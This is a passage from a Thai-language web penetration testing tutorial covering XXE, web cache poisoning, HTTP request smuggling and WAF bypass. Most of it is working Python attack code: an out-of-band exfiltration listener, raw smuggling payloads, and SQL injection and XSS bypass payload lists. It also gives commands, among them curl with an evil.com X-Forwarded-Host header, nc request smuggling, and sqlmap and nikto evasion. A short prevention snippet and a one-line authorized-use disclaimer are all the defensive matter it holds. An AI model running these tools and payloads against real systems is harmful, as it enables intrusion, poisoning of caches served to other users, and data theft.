        return results
    
    def setup_oob_server(self, port: int = 8888) -> None:
        """ตั้ง HTTP server สำหรับ OOB data exfiltration"""
        from http.server import HTTPServer, BaseHTTPRequestHandler
        import urllib.parse
        
        class OOBHandler(BaseHTTPRequestHandler):
            def do_GET(self):
                params = urllib.parse.parse_qs(
                    urllib.parse.urlparse(self.path).query
                )
                if 'data' in params:
                    print(f"[XXE OOB] Received: {params['data'][0]}")
                self.send_response(200)
                self.end_headers()
        
        server = HTTPServer(('0.0.0.0', port), OOBHandler)
        print(f"[*] OOB Server listening on port {port}")
        server.serve_forever()


# XXE Security Controls
XXE_DEFENSES = """
=== XXE Prevention ===

Java (JAXP):
  factory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);
  factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
  factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);

Python (lxml):
  parser = etree.XMLParser(resolve_entities=False, no_network=True)

PHP:
  libxml_disable_entity_loader(true);

Node.js:
  // Use expat or fast-xml-parser (not libxmljs without config)
"""
```

---

## Step 528: Web Cache Poisoning

### Cache Poisoning Framework
```python
#!/usr/bin/env python3
# cache_poisoning_tester.py

import requests

class CachePoisoningTester:
    """Web Cache Poisoning Testing"""
    
    def __init__(self, url: str):
        self.url = url
        self.session = requests.Session()
    
    def find_unkeyed_headers(self) -> list:
        """ค้นหา headers ที่เป็น unkeyed (cache key ไม่รวมแต่ server ใช้)"""
        test_headers = [
            'X-Forwarded-Host',
            'X-Host',
            'X-Forwarded-Server',
            'X-HTTP-Host-Override',
            'Forwarded',
            'X-Forwarded-For',
            'X-Original-URL',
            'X-Rewrite-URL',
        ]
        
        # Request baseline
        baseline = self.session.get(self.url)
        baseline_content = baseline.text
        
        unkeyed = []
        for header in test_headers:
            resp = self.session.get(
                self.url,
                headers={header: 'cache-probe-test.com'}
            )
            
            # ถ้า response เป็น cached = header นี้ไม่เป็น cache key
            if 'cache-probe-test.com' in resp.text:
                unkeyed.append(header)
                print(f"[!] Unkeyed header: {header}")
        
        return unkeyed
    
    def poison_with_host(self, malicious_host: str) -> dict:
        """Poison cache ด้วย X-Forwarded-Host"""
        headers = {'X-Forwarded-Host': malicious_host}
        
        # Poisoning request
        resp = self.session.get(self.url, headers=headers)
        
        # Verify cache ถูก poison
        verify = self.session.get(self.url)  # ไม่ส่ง header
        
        return {
            'poisoned': malicious_host in verify.text,
            'poison_response': resp.status_code,
            'verify_contains_poison': malicious_host in verify.text
        }
    
    def test_parameter_pollution(self) -> list:
        """Test Web Cache Deception ด้วย Parameter Pollution"""
        attacks = [
            '?utm_source=cache-test',
            '?cb=1',  # cache buster as poisoning vector
            '?_=1337',
        ]
        
        results = []
        for attack in attacks:
            url = self.url + attack
            resp = self.session.get(url)
            
            # ตรวจว่า cache เก็บ response นี้หรือไม่
            results.append({
                'url': url,
                'cached': 'HIT' in resp.headers.get('X-Cache', '') or 
                           resp.headers.get('CF-Cache-Status') == 'HIT',
                'headers': dict(resp.headers)
            })
        
        return results


# Cache Poisoning Commands
CACHE_COMMANDS = """
# ตรวจ cache headers
curl -I https://target.com | grep -i 'cache\|age\|x-varnish\|cf-cache'

# Test with Burp Param Miner
# Extensions -> Param Miner -> Guess headers

# Test manually
curl -H 'X-Forwarded-Host: evil.com' https://target.com
curl https://target.com  # ตรวจว่า evil.com อยู่ response

# Cache buster (ป้องกัน cache เดิม)
curl 'https://target.com?cb='$(date +%s) -H 'X-Forwarded-Host: evil.com'
"""
```

---

## Step 529: HTTP Request Smuggling

### Request Smuggling Framework
```python
#!/usr/bin/env python3
# request_smuggling.py

import socket
import ssl

class RequestSmuggling:
    """HTTP Request Smuggling Testing"""
    
    def __init__(self, host: str, port: int = 80, use_ssl: bool = False):
        self.host = host
        self.port = port
        self.use_ssl = use_ssl
    
    def send_raw(self, payload: bytes) -> bytes:
        """Send raw HTTP request"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)
        
        if self.use_ssl:
            context = ssl.create_default_context()
            sock = context.wrap_socket(sock, server_hostname=self.host)
        
        sock.connect((self.host, self.port))
        sock.send(payload)
        
        response = b''
        while True:
            try:
                data = sock.recv(4096)
                if not data:
                    break
                response += data
            except socket.timeout:
                break
        
        sock.close()
        return response
    
    def test_cl_te(self) -> bytes:
        """Test CL.TE smuggling (Content-Length front, Transfer-Encoding back)"""
        payload = (
            b"POST / HTTP/1.1\r\n"
            b"Host: " + self.host.encode() + b"\r\n"
            b"Content-Type: application/x-www-form-urlencoded\r\n"
            b"Content-Length: 6\r\n"
            b"Transfer-Encoding: chunked\r\n"
            b"\r\n"
            b"0\r\n"
            b"\r\n"
            b"G"  # smuggled 'G' ไป request ถัดไป
        )
        return self.send_raw(payload)
    
    def test_te_cl(self) -> bytes:
        """Test TE.CL smuggling (Transfer-Encoding front, Content-Length back)"""
        payload = (
            b"POST / HTTP/1.1\r\n"
            b"Host: " + self.host.encode() + b"\r\n"
            b"Content-Type: application/x-www-form-urlencoded\r\n"
            b"Content-Length: 3\r\n"
            b"Transfer-Encoding: chunked\r\n"
            b"\r\n"
            b"1\r\n"
            b"G\r\n"
            b"0\r\n"
            b"\r\n"
        )
        return self.send_raw(payload)
    
    def test_te_te_obfuscated(self) -> bytes:
        """Test TE.TE smuggling ด้วย obfuscated Transfer-Encoding"""
        # ใช้ TE header variant เพื่อ bypass front-end
        te_variants = [
            b"Transfer-Encoding: xchunked",
            b"Transfer-Encoding : chunked",
            b"Transfer-Encoding: chunked, identity",
            b"X-TE: chunked",
            b"Transfer-Encoding:\x09chunked",  # tab
        ]
        
        results = []
        for te in te_variants:
            payload = (
                b"POST / HTTP/1.1\r\n"
                b"Host: " + self.host.encode() + b"\r\n"
                b"Content-Length: 4\r\n"
                + te + b"\r\n"
                b"\r\n"
                b"5c\r\n"
                b"SMUGGLED\r\n"
                b"0\r\n"
                b"\r\n"
            )
            resp = self.send_raw(payload)
            results.append({'te_header': te.decode(), 'response': resp[:200]})
        
        return results
    
    def detect_smuggling(self) -> dict:
        """Detect Request Smuggling ด้วยวิธี timing"""
        # CL.TE timing attack: ส่ง incomplete TE body -> back-end รอ
        timing_payload = (
            b"POST / HTTP/1.1\r\n"
            b"Host: " + self.host.encode() + b"\r\n"
            b"Content-Type: application/x-www-form-urlencoded\r\n"
            b"Content-Length: 4\r\n"
            b"Transfer-Encoding: chunked\r\n"
            b"\r\n"
            b"1\r\n"
            b"A"
            # ไม่จบ chunk -> back-end TE จะรอ timeout
        )
        
        import time
        start = time.time()
        resp = self.send_raw(timing_payload)
        elapsed = time.time() - start
        
        return {
            'response_time': elapsed,
            'cl_te_vulnerable': elapsed > 8.0,  # timeout = vulnerable
            'response': resp[:200]
        }


# Smuggling Tools
SMUGGLING_TOOLS = """
# Smuggler - automated request smuggling
git clone https://github.com/defparam/smuggler
python3 smuggler.py -u https://target.com/
python3 smuggler.py -u https://target.com/ -m POST

# Burp Suite - HTTP Request Smuggler extension
# Extensions -> BApp Store -> HTTP Request Smuggler

# Manual testing with nc
nc target.com 80 << 'EOF'
POST / HTTP/1.1
Host: target.com
Content-Length: 6
Transfer-Encoding: chunked

0

GEOF
"""
```

---

## Step 530: Web Application Firewall (WAF) Bypass

### WAF Bypass Techniques
```python
#!/usr/bin/env python3
# waf_bypass.py

import requests
import base64

class WAFBypass:
    """Web Application Firewall Bypass Techniques"""
    
    def __init__(self, url: str):
        self.url = url
        self.session = requests.Session()
    
    def detect_waf(self) -> dict:
        """Detect WAF ที่ใช้งาน"""
        # ส่ง malicious payload -> ดู response
        probe = self.session.get(
            self.url + "?id=' OR '1'='1"
        )
        
        waf_signatures = {
            'Cloudflare': ['cloudflare', '__cfduid', 'cf-ray'],
            'ModSecurity': ['mod_security', 'NOYB'],
            'F5 BIG-IP': ['BigIP', 'F5'],
            'Akamai': ['akamai', 'AkamaiGHost'],
            'Imperva': ['imperva', 'incapsula'],
            'AWS WAF': ['aws-waf', 'x-amzn-RequestId'],
            'Sucuri': ['sucuri', 'x-sucuri-id'],
        }
        
        detected = []
        headers_text = str(probe.headers).lower()
        body_text = probe.text.lower()
        
        for waf, signatures in waf_signatures.items():
            for sig in signatures:
                if sig.lower() in headers_text or sig.lower() in body_text:
                    detected.append(waf)
                    break
        
        return {
            'waf_detected': detected,
            'status_code': probe.status_code,
            'blocked': probe.status_code in [403, 406, 429, 503]
        }
    
    def bypass_sql_injection_waf(self, param: str) -> list:
        """WAF Bypass สำหรับ SQL Injection"""
        # Encoding techniques
        payloads = [
            # URL encoding
            "'%20OR%20'1'%3D'1",
            # Double URL encoding
            "%2527%2520OR%2527%25271%2527%253D%25271",
            # HTML entities
            "' &#79;&#82; '1'='1",
            # Case variation
            "' oR '1'='1",
            "' Or '1'='1",
            # Comment injection
            "'/**/OR/**/1=1",
            "' OR/*!00000*/1=1--",
            # Whitespace alternatives
            "'\t\tOR\t\t'1'='1",
            "'%09OR%09'1'='1",
            "'%0aOR%0a'1'='1",
            # Unicode encoding
            "' OR '1'='1",
        ]
        
        results = []
        for payload in payloads:
            resp = self.session.get(
                self.url, params={param: payload}
            )
            results.append({
                'payload': payload,
                'status': resp.status_code,
                'bypassed': resp.status_code != 403
            })
            if resp.status_code != 403:
                print(f"[!] WAF bypass: {payload[:50]}")
        
        return results
    
    def bypass_xss_waf(self, param: str) -> list:
        """WAF Bypass สำหรับ XSS"""
        payloads = [
            # Event handlers
            '<img src=x onerror=alert(1)>',
            '<img src=x OnErRoR=alert(1)>',
            # No quotes
            '<img src=x onerror=alert`1`>',
            # SVG
            '<svg onload=alert(1)>',
            # Template literals
            '<img src=x onerror=window[`alert`](1)>',
            # Hex encoding
            '<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>',
            # Base64
            '<img src=x onerror=eval(atob("YWxlcnQoMSk="))>',
            # Unicode
            '<img src=x onerror=alert(1)>',
            # HTML5 tags
            '<details open ontoggle=alert(1)>',
            '<video src=x onerror=alert(1)>',
        ]
        
        results = []
        for payload in payloads:
            resp = self.session.get(
                self.url, params={param: payload}
            )
            results.append({
                'payload': payload,
                'status': resp.status_code,
                'bypassed': resp.status_code != 403 and payload in resp.text
            })
        
        return results


# WAF Bypass Tools
WAF_TOOLS = """
# wafw00f - WAF detection
pip3 install wafw00f
wafw00f https://target.com
wafw00f -a https://target.com  # try all WAFs

# sqlmap WAF bypass
sqlmap -u 'https://target.com/page?id=1' --tamper=charencode,space2comment
sqlmap --list-tampers  # ดู tamper scripts

# Common tampers:
# charencode      - URL encode all characters
# space2comment   - replace spaces with /**/ 
# randomcase      - random case: AND -> AnD
# between         - replace > with BETWEEN
# base64encode    - encode in base64

# nikto WAF bypass
nikto -h target.com -evasion 1,2,3,4
"""

if __name__ == '__main__':
    waf = WAFBypass('http://target.com')
    
    print("[*] Detecting WAF...")
    result = waf.detect_waf()
    print(f"[*] WAF: {result['waf_detected']}")
    
    if result['blocked']:
        print("[*] Testing WAF bypass techniques...")
        sql_results = waf.bypass_sql_injection_waf('id')
        xss_results = waf.bypass_xss_waf('name')
```

---

## สรุป Part 53

ในส่วนนี้เราได้เรียนรู้:
- **Step 521**: GraphQL Security Testing (ทดสอบ Introspection, Injection, DoS)
- **Step 522**: gRPC Security Testing (สำรวจ services, auth bypass, injection)
- **Step 523**: REST API Security Testing (IDOR, Mass Assignment, Rate Limiting)
- **Step 524**: JWT Token Attacks (None alg, RS256->HS256, Secret cracking)
- **Step 525**: OAuth 2.0 Vulnerabilities (CSRF, redirect bypass, PKCE)
- **Step 526**: Server-Side Template Injection (Jinja2, Twig, FreeMarker RCE)
- **Step 527**: XML External Entity (XXE) Injection
- **Step 528**: Web Cache Poisoning
- **Step 529**: HTTP Request Smuggling (CL.TE, TE.CL, TE.TE)
- **Step 530**: Web Application Firewall (WAF) Bypass

ทุกเทคนิคต้องใช้ใน **authorized testing environment** เท่านั้น
